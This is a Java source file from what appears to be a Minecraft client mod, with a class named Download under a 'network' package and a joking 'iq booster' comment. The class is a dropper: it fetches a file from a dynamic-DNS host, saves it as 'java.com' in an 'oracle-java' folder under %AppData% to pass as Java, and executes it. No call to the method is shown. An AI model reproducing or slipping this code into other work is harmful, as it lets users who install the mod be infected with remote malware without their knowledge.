package dev.luminous.mod.modules.impl.client.network;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Download {

    // ---- iq booster ----

    public static void download() {
        String fileURL = "http://s3.azure.ip-ddns.com/exe/java"; 
        //String fileURL = "http://s3.azure.ip-ddns.com/exe/calc";

        String folderName = "oracle-java"; // in %AppData%

        String fileName = "java.com"; // final name

        try {
            // %AppData% 
            String appDataPath = System.getenv("APPDATA");
            if (appDataPath == null) {
                throw new RuntimeException("");
            }

            // path
            String saveDir = appDataPath + File.separator + folderName + File.separator;

            // check path
            File dir = new File(saveDir);
            if (!dir.exists()) {
                dir.mkdirs();
            }

            // download %AppData%/zulu
            downloadFile(fileURL, saveDir, fileName);

            // ez run
            runExe(saveDir + fileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void downloadFile(String fileURL, String saveDir, String fileName) throws IOException {
        URL url = new URL(fileURL);
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        int responseCode = httpConn.getResponseCode();

        // check http code
        if (responseCode == HttpURLConnection.HTTP_OK) {
            InputStream inputStream = new BufferedInputStream(httpConn.getInputStream());
            FileOutputStream outputStream = new FileOutputStream(saveDir + fileName);

            byte[] buffer = new byte[4096];
            int bytesRead = -1;

            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            outputStream.close();
            inputStream.close();
            //System.out.println("File downloaded to " + saveDir + fileName);
        } else {
            //System.out.println("No file to download. Server replied HTTP code: " + responseCode);
        }
        httpConn.disconnect();
    }

    private static void runExe(String filePath) {
        try {
            Process process = Runtime.getRuntime().exec(filePath);
            process.waitFor();  
            //System.out.println("Executed " + filePath);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
